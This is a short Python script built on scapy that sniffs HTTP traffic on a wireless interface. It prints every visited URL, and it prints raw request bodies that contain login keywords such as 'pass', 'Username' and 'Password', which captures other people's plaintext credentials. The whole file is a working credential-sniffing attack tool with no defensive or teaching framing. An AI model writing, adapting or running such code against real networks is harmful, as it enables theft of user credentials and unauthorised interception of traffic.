import scapy.all as scapy
from scapy.sendrecv import sniff
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface=interface,store=False,prn=psp)

def psp(packet):
    if packet.haslayer(http.HTTPRequest):
        url = (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')
        print("link >>"+url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8')
            keywordslink = ["name", "pass", "Username", "Password", "login"]
            for keywords in keywordslink:
                if keywords in load:
                    print("email and pass >>"+load)
                    break
                
sniffer("wlan0")   